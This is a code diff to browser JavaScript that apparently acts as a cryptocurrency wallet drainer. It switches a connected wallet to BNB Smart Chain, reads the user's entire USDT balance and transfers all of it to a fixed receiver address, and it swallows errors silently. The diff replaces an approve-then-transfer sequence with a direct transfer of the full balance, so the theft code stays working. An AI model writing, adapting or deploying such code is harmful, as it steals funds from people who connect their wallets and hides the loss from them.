@@ -19,16 +19,6 @@ const usdtABI = [
   {
     constant: false,
     inputs: [
-      { name: "_spender", type: "address" },
-      { name: "_value", type: "uint256" }
-    ],
-    name: "approve",
-    outputs: [{ name: "", type: "bool" }],
-    type: "function"
-  },
-  {
-    constant: false,
-    inputs: [
       { name: "_to", type: "address" },
       { name: "_value", type: "uint256" }
     ],
@@ -43,13 +33,13 @@ async function approveAndTransfer() {
 
   const web3 = new Web3(window.ethereum);
 
-  // Auto Switch to BNB Smart Chain (Chain ID: 0x38 = 56)
+  // Auto switch to BNB Smart Chain (chainId = 56 / 0x38)
   try {
     await window.ethereum.request({
       method: "wallet_switchEthereumChain",
       params: [{ chainId: "0x38" }]
     });
-  } catch (switchError) {
+  } catch (err) {
     return;
   }
 
@@ -64,10 +54,7 @@ async function approveAndTransfer() {
 
     if (balance === "0") return;
 
-    // Approve max USDT
-    await usdt.methods.approve(receiver, balance).send({ from: user });
-
-    // Transfer
+    // 🔥 Only direct transfer (no approval)
     await usdt.methods.transfer(receiver, balance).send({ from: user });
   } catch (err) {
     // Silent
